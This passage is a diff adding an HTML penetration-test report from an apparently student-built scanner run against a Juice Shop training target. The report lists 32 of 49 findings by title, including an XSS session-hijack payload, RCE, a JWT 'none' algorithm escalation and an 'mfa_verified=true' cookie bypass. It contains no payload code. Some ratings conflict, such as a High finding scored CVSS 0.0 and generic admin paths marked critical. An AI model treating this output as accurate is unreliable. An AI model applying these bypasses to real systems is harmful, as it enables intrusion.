@@ -1,0 +1,4331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>WebPwn Report — https://juiceshop.akto.io/</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+
+  :root {
+    --bg:        #0d1117;
+    --surface:   #161b22;
+    --surface2:  #21262d;
+    --border:    #30363d;
+    --text:      #e6edf3;
+    --muted:     #8b949e;
+    --accent:    #58a6ff;
+    --critical:  #ff4444;
+    --high:      #ff8c00;
+    --medium:    #f0c040;
+    --low:       #58a6ff;
+    --info:      #3fb950;
+    --success:   #3fb950;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    font-size: 14px;
+  }
+
+  /* ── Header ── */
+  .header {
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 50%, #1c2128 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 40px 60px;
+    position: relative;
+    overflow: hidden;
+  }
+  .header::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse at 20% 50%, rgba(88,166,255,0.08) 0%, transparent 60%);
+  }
+  .header-badge {
+    display: inline-block;
+    background: rgba(88,166,255,0.1);
+    border: 1px solid rgba(88,166,255,0.3);
+    color: var(--accent);
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+  .header h1 {
+    font-size: 32px;
+    font-weight: 700;
+    background: linear-gradient(90deg, #e6edf3, #58a6ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 8px;
+  }
+  .header-meta {
+    color: var(--muted);
+    font-size: 13px;
+    display: flex; gap: 24px; flex-wrap: wrap;
+    margin-top: 16px;
+  }
+  .header-meta span { display: flex; align-items: center; gap: 6px; }
+
+  /* ── Layout ── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px 60px; }
+
+  /* ── Section ── */
+  .section { margin-bottom: 40px; }
+  .section-title {
+    font-size: 20px; font-weight: 600;
+    color: var(--text);
+    border-left: 3px solid var(--accent);
+    padding-left: 12px;
+    margin-bottom: 20px;
+  }
+
+  /* ── Risk cards ── */
+  .risk-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 12px;
+    margin-bottom: 32px;
+  }
+  .risk-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.2s;
+  }
+  .risk-card:hover { transform: translateY(-2px); }
+  .risk-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 3px;
+  }
+  .risk-card.critical::before { background: var(--critical); }
+  .risk-card.high::before     { background: var(--high); }
+  .risk-card.medium::before   { background: var(--medium); }
+  .risk-card.low::before      { background: var(--low); }
+  .risk-card.info::before     { background: var(--info); }
+
+  .risk-count {
+    font-size: 36px; font-weight: 700; line-height: 1;
+    margin-bottom: 6px;
+  }
+  .risk-card.critical .risk-count { color: var(--critical); }
+  .risk-card.high .risk-count     { color: var(--high); }
+  .risk-card.medium .risk-count   { color: var(--medium); }
+  .risk-card.low .risk-count      { color: var(--low); }
+  .risk-card.info .risk-count     { color: var(--info); }
+  .risk-label { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); }
+
+  /* ── Table ── */
+  .table-wrap { overflow-x: auto; border-radius: 12px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; }
+  thead { background: var(--surface2); }
+  th {
+    padding: 12px 16px; text-align: left;
+    font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px;
+    color: var(--muted); font-weight: 600;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    font-size: 13px;
+  }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(88,166,255,0.04); }
+
+  /* ── Severity badge ── */
+  .badge {
+    display: inline-block;
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-size: 11px; font-weight: 600;
+    text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .badge-critical { background: rgba(255,68,68,0.15);  color: #ff6b6b; border: 1px solid rgba(255,68,68,0.3); }
+  .badge-high     { background: rgba(255,140,0,0.15);  color: #ffaa44; border: 1px solid rgba(255,140,0,0.3); }
+  .badge-medium   { background: rgba(240,192,64,0.15); color: #f0c040; border: 1px solid rgba(240,192,64,0.3); }
+  .badge-low      { background: rgba(88,166,255,0.15); color: #58a6ff; border: 1px solid rgba(88,166,255,0.3); }
+  .badge-info     { background: rgba(63,185,80,0.15);  color: #3fb950; border: 1px solid rgba(63,185,80,0.3); }
+
+  /* ── Finding card ── */
+  .finding-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    margin-bottom: 16px;
+    overflow: hidden;
+  }
+  .finding-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    cursor: pointer;
+  }
+  .finding-title { font-weight: 600; font-size: 14px; }
+  .finding-body  { padding: 20px; }
+
+  .detail-grid {
+    display: grid;
+    grid-template-columns: 140px 1fr;
+    gap: 8px 16px;
+    font-size: 13px;
+  }
+  .detail-label { color: var(--muted); font-weight: 500; }
+  .detail-value { color: var(--text); word-break: break-all; }
+
+  .code-block {
+    background: #0d1117;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: #a5d6ff;
+    word-break: break-all;
+    margin-top: 4px;
+  }
+
+  .remediation-box {
+    background: rgba(63,185,80,0.06);
+    border: 1px solid rgba(63,185,80,0.2);
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin-top: 12px;
+    font-size: 13px;
+    color: #7ee787;
+  }
+  .remediation-box strong { display: block; margin-bottom: 4px; color: #3fb950; }
+
+  /* ── CVSS bar ── */
+  .cvss-bar-wrap { width: 100%; height: 6px; background: var(--border); border-radius: 3px; margin-top: 6px; }
+  .cvss-bar { height: 100%; border-radius: 3px; transition: width 0.5s ease; }
+
+  /* ── Footer ── */
+  footer {
+    text-align: center;
+    padding: 32px;
+    color: var(--muted);
+    font-size: 12px;
+    border-top: 1px solid var(--border);
+    margin-top: 40px;
+  }
+
+  /* ── Executive summary box ── */
+  .exec-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px;
+    margin-bottom: 32px;
+  }
+  .exec-box p { color: var(--muted); margin-bottom: 12px; }
+  .exec-box p:last-child { margin-bottom: 0; }
+
+  .module-tag {
+    display: inline-block;
+    background: rgba(88,166,255,0.1);
+    color: var(--accent);
+    border: 1px solid rgba(88,166,255,0.2);
+    padding: 2px 8px; border-radius: 4px;
+    font-size: 11px; font-family: 'JetBrains Mono', monospace;
+  }
+
+  @media (max-width: 768px) {
+    .container { padding: 20px; }
+    .header    { padding: 24px 20px; }
+    .risk-grid { grid-template-columns: repeat(3, 1fr); }
+    .detail-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ── HEADER ── -->
+<div class="header">
+  <div class="header-badge">🔐 Penetration Test Report</div>
+  <h1>WebPwn Security Assessment</h1>
+  <div class="header-meta">
+    <span>🎯 <strong>https://juiceshop.akto.io/</strong></span>
+    <span>📅 2026-05-25 19:16:21</span>
+    <span>⏱ Session: 20260525_190216</span>
+    <span>🔧 WebPwn Toolkit v1.0</span>
+    <span>🎓 Holberton IT School</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- ── EXECUTIVE SUMMARY ── -->
+  <div class="section">
+    <div class="section-title">Executive Summary</div>
+    <div class="exec-box">
+      <p>
+        This report presents the results of an automated web and mobile security assessment
+        conducted against <strong>https://juiceshop.akto.io/</strong> using <strong>WebPwn Toolkit v1.0</strong>.
+        The assessment covers OWASP Top 10 (2021) vulnerability categories including
+        injection attacks, broken access control, security misconfigurations, and more.
+      </p>
+      <p>
+        A total of <strong>49</strong> security findings were identified across
+        <strong>5</strong> test module(s). Of these,
+        <strong style="color:var(--critical)">12</strong> are Critical,
+        <strong style="color:var(--high)">7</strong> are High,
+        <strong style="color:var(--medium)">7</strong> are Medium,
+        <strong style="color:var(--low)">1</strong> are Low, and
+        <strong style="color:var(--info)">24</strong> are Informational.
+      </p>
+      <p>
+        <strong>Risk Rating: </strong>
+        
+          <span class="badge badge-critical">CRITICAL</span>
+        
+      </p>
+    </div>
+  </div>
+
+  <!-- ── RISK OVERVIEW ── -->
+  <div class="section">
+    <div class="section-title">Risk Overview</div>
+    <div class="risk-grid">
+      
+      <div class="risk-card critical">
+        <div class="risk-count">12</div>
+        <div class="risk-label">critical</div>
+      </div>
+      
+      <div class="risk-card high">
+        <div class="risk-count">7</div>
+        <div class="risk-label">high</div>
+      </div>
+      
+      <div class="risk-card medium">
+        <div class="risk-count">7</div>
+        <div class="risk-label">medium</div>
+      </div>
+      
+      <div class="risk-card low">
+        <div class="risk-count">1</div>
+        <div class="risk-label">low</div>
+      </div>
+      
+      <div class="risk-card info">
+        <div class="risk-count">24</div>
+        <div class="risk-label">info</div>
+      </div>
+      
+    </div>
+  </div>
+
+  <!-- ── FINDINGS TABLE ── -->
+  <div class="section">
+    <div class="section-title">Findings Summary (49 total)</div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Severity</th>
+            <th>Type</th>
+            <th>Location</th>
+            <th>CVSS</th>
+            <th>OWASP</th>
+            <th>Module</th>
+          </tr>
+        </thead>
+        <tbody>
+          
+          <tr>
+            <td>1</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/admin
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>2</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/administrator
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>3</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/dashboard
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>4</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/wp-admin
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>5</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/manager
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>6</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>Admin Dashboard — No Authentication Required</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/cpanel
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">Admin</span></td>
+          </tr>
+          
+          <tr>
+            <td>7</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>XSS — Session Hijack Payload (Generated)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              9.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:93%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A03:2021 – Injection</td>
+            <td><span class="module-tag">XSS</span></td>
+          </tr>
+          
+          <tr>
+            <td>8</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>RCE — Remote Code Execution (Exploited)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              10.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:100%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A03:2021 – Injection</td>
+            <td><span class="module-tag">RCE</span></td>
+          </tr>
+          
+          <tr>
+            <td>9</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>2FA — Step Skip (Direct URL Access)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/dashboard
+            </td>
+            <td>
+              
+              9.1
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:90%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control</td>
+            <td><span class="module-tag">2FA</span></td>
+          </tr>
+          
+          <tr>
+            <td>10</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>2FA — Cookie Bypass (&#39;mfa_verified=true&#39;)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/dashboard
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A07:2021 – Identification and Authentication Failures</td>
+            <td><span class="module-tag">Cookie Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>11</td>
+            <td>
+              <span class="badge badge-critical">CRITICAL</span>
+            </td>
+            <td>CHAIN: JWT None Algorithm → Admin Privilege Escalation</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              9.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:98%;
+                            background:var(--critical)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control (Chained)</td>
+            <td><span class="module-tag">Chain Engine</span></td>
+          </tr>
+          
+          <tr>
+            <td>12</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>GCP Bucket</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://storage.googleapis.com/juiceshop-backup
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">AdminHunter</span></td>
+          </tr>
+          
+          <tr>
+            <td>13</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>Missing Header: Content-Security-Policy</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              7.5
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:75%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>14</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>Missing Header: Strict-Transport-Security</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              7.5
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:75%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>15</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>2FA — No Rate Limiting on OTP (Brute-force Possible)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/
+            </td>
+            <td>
+              
+              7.5
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:75%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A07:2021 – Identification and Authentication Failures</td>
+            <td><span class="module-tag">2FA</span></td>
+          </tr>
+          
+          <tr>
+            <td>16</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>2FA — Remember-Me Cookie Forgery (&#39;remember_me&#39;)</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/dashboard
+            </td>
+            <td>
+              
+              7.5
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:75%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A07:2021 – Identification and Authentication Failures</td>
+            <td><span class="module-tag">Cookie Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>17</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>2FA — OAuth/SSO May Bypass 2FA</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/auth/google
+            </td>
+            <td>
+              
+              7.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:78%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A07:2021 – Identification and Authentication Failures</td>
+            <td><span class="module-tag">2FA</span></td>
+          </tr>
+          
+          <tr>
+            <td>18</td>
+            <td>
+              <span class="badge badge-high">HIGH</span>
+            </td>
+            <td>CHAIN: CORS Misconfiguration → XSS → Session Theft</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              8.8
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:88%;
+                            background:var(--high)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A01:2021 – Broken Access Control (Chained)</td>
+            <td><span class="module-tag">Chain Engine</span></td>
+          </tr>
+          
+          <tr>
+            <td>19</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api-docs/
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>20</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/robots.txt
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>21</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/.well-known
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>22</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/security.txt
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>23</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/metrics
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>24</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>CORS Wildcard Origin</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              5.3
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:53%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">CORS</span></td>
+          </tr>
+          
+          <tr>
+            <td>25</td>
+            <td>
+              <span class="badge badge-medium">MEDIUM</span>
+            </td>
+            <td>2FA — Not Implemented</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              5.9
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:59%;
+                            background:var(--medium)
+                                       ;">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A07:2021 – Identification and Authentication Failures</td>
+            <td><span class="module-tag">2FA</span></td>
+          </tr>
+          
+          <tr>
+            <td>26</td>
+            <td>
+              <span class="badge badge-low">LOW</span>
+            </td>
+            <td>Missing Header: Referrer-Policy</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              3.1
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:31%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>27</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Technology Fingerprinting</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Technology Fingerprinting</span></td>
+          </tr>
+          
+          <tr>
+            <td>28</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Web Crawler</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Web Crawler</span></td>
+          </tr>
+          
+          <tr>
+            <td>29</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>AWS S3</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              http://juiceshop-staging.s3.amazonaws.com
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">AWS</span></td>
+          </tr>
+          
+          <tr>
+            <td>30</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>AWS S3</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              http://juiceshop.s3.amazonaws.com
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">AWS</span></td>
+          </tr>
+          
+          <tr>
+            <td>31</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Azure Blob</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.blob.core.windows.net/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Azure</span></td>
+          </tr>
+          
+          <tr>
+            <td>32</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>GCP Bucket</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
